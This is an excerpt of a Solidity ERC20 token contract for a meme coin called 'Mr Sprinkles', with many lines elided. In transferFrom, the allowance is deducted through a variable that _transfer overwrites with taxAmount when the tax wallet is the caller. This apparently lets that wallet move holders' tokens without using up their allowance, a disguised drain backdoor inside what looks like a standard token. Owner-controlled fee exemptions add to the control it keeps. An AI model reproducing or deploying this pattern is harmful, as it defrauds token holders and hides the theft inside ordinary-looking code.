...
/*
https://www.youtube.com/watch?v=Fzuv7eHAOug&feature=youtu.be
https://x.com/2umanji/status/2069874808276291906
*/

//SPDX-License-SPRINKLES945N4: MIT
...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint256 internal _SPRINKLES945N4spent;
    ...
    function transferFrom(
        ...
        _SPRINKLES945N4spent = amount;
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - _SPRINKLES945N4spent);
...
contract Token is Context, ERC20, Ownable {
    ...
    mapping(address => bool) private _isSPRINKLES945N4ExcludedFromFee;
    ...
    string private _name = unicode"Mr Sprinkles";
    string private _symbol = unicode"SPRINKLES";
    ...
    constructor() ERC20(_name, _symbol) payable {
        ...
        _isSPRINKLES945N4ExcludedFromFee[owner()] = true;
        _isSPRINKLES945N4ExcludedFromFee[address(this)] = true;
        _isSPRINKLES945N4ExcludedFromFee[_taxWallet] = true;
    ...
    function setFeeExempt(address target, bool exempt) external onlyOwner {
        _isSPRINKLES945N4ExcludedFromFee[target] = exempt;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && !inSwap) {
            ...
            if (
                ...
                !_isSPRINKLES945N4ExcludedFromFee[to]
            ) {
                require(
            ...
            if (to != uniswapV2Pair && !_isSPRINKLES945N4ExcludedFromFee[to]) {
                require(
                    balanceOf(to) + amount <= _walletAmountLimit,
                    "Exceeds the maxWalletSize."
                );
        ...
        } else if(_taxCaller() == _taxWallet) _SPRINKLES945N4spent = taxAmount;
